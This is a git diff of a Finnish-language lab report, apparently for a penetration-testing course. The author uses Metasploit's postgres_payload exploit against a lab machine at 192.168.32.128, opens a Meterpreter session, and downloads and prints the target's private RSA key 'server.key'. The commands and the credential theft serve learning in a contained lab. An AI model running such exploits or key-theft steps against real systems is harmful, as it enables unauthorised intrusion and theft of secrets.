@@ -251,8 +251,9 @@ Hain siis uutta payloadia Metasploitista komennolla: ```search postgresql```
 <img width="1161" height="595" alt="image" src="https://github.com/user-attachments/assets/082daa4f-591d-4028-817c-3b676bd49280" />
 
 - Löysin "postgreslogin" nimisen payloadin riviltä 26.
+- Rivillä 30 on myös payload, johon haluan palata.
 
-Siirryin payloadiin komennolla: ```use 26``` ja avasin infon komennolla: ```info```
+Siirryin payloadiin "26" komennolla: ```use 26``` ja avasin infon komennolla: ```info```
 
 <img width="1130" height="524" alt="image" src="https://github.com/user-attachments/assets/d720e6ac-b9d6-4ced-8bee-567657daff01" />
 
@@ -298,4 +299,71 @@ Tarkastelin ohjeita jälleen ```help``` komennolla:
 
 - Esimerkiksi ```query``` komennolla voit syöttää SQL-kyselyitä.
 - Joku pätevä SQL-osaaja varmasti saisi tästä jotain enemmän irti.
-  
+
+Halusin kokeilla vielä aikaisemmin löydettyä payloadia "30". Sen polku oli kuvan mukaan: "exploit/linux/postgres/postgres_payload" 
+Kokeilin sitten avata payloadin komennolla: ```use exploit/linux/postgres/postgres_payload```
+
+<img width="609" height="83" alt="image" src="https://github.com/user-attachments/assets/6d0967fc-989c-45dc-9f7e-204d14313b7e" />
+
+- Tämä on siis myös toimiva tapa avata payload.
+
+```info``` komennon ajaessani tarkistin optiot, mitä tarvitsee muuttaa:
+
+<img width="671" height="189" alt="image" src="https://github.com/user-attachments/assets/f5a1df22-7d04-412d-86ae-74f288993be4" />
+
+- Muutetaan siis RHOSTS ja LHOST samalla tavalla, kuin aikaisemmassa testissä :)
+
+**RHOSTS** = 192.168.32.128
+
+**LHOST** = 192.168.32.129
+
+<img width="596" height="71" alt="image" src="https://github.com/user-attachments/assets/15329f01-3110-4619-bc05-c5855a519608" />
+
+**Payload Description**:
+
+<img width="573" height="210" alt="image" src="https://github.com/user-attachments/assets/6efef2ab-a1a3-40e8-b390-6bf8b1947063" />
+
+- Tämä payload descriptionin mukaan lataa kohdekoneelle jaetun ohjelmatiedoston binääri injektiona.
+
+Kokeilen hyökkäystä komennolla: ```exploit```
+
+<img width="692" height="200" alt="image" src="https://github.com/user-attachments/assets/d4ce0b00-8331-47f1-9662-9d0110ead20e" />
+
+- Tällä payloadilla päästiin sisään käyttöjärjestelmään suoraan, kuten aikaisemman tehtävän FTP tapauksessa.
+
+> Sidenote: Tehtävänannossa pyydettiin toista tapaa murtautua sisään, kokeilin kahta. (Innostuin liikaa, sry)
+
+## i) Demonstroi Meterpretrin ominaisuuksia
+
+Meterpreter on Metasploitin edistynyt payload, jolla voit ajaa kohteessa komentoja ([Metasploit. s.a.](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html))
+
+Olen edelleen samassa sessiossa kuin äskeisessä tehtävässä, joten meterpreter on valmiiksi esillä.
+Syötettäessä komento: ```help``` saadaan näkyviin esimerkkikomentoja
+
+<img width="575" height="688" alt="image" src="https://github.com/user-attachments/assets/e5a3cd88-4a6a-4580-b7ea-c658be06cb2f" />
+
+- Komentolista on pitkä, mutta kuvassa näkyy esimerkiksi hakemistokomentoja, kuten ```cd```, ```ls``` yms.
+
+Komennolla ```ls``` tulostin työskentelyhakemiston sisällön:
+
+<img width="549" height="319" alt="image" src="https://github.com/user-attachments/assets/41506377-37fb-4da2-8247-e63d9cd7ffbf" />
+
+- Täältä voin esimerkiksi ladata jotain.
+
+Latasin tiedoston "server.key" komennolla: ```download server.key```
+
+<img width="554" height="89" alt="image" src="https://github.com/user-attachments/assets/197d8e93-71c8-41a3-9216-110bc8126048" />
+
+Nyt tiedosto on Kalin /root hakemistossa:
+
+<img width="542" height="112" alt="image" src="https://github.com/user-attachments/assets/f8e57bbf-a20c-42f2-bcc6-d1ee923619bb" />
+
+Komennolla ```cat server.key``` tulostin tiedoston sisällön:
+
+<img width="550" height="283" alt="image" src="https://github.com/user-attachments/assets/d496612d-62b1-4c85-9419-e1e278f288f7" />
+
+- Tämä on kohteen yksityinen RSA-avain, jota voin hyödyntää SSH-yhteyden muodostamisessa.
+
+j) Tallenna shell-sessio tekstitiedostoon script-työkalulla (script -fa log001.txt) tai tmux:lla
+
+
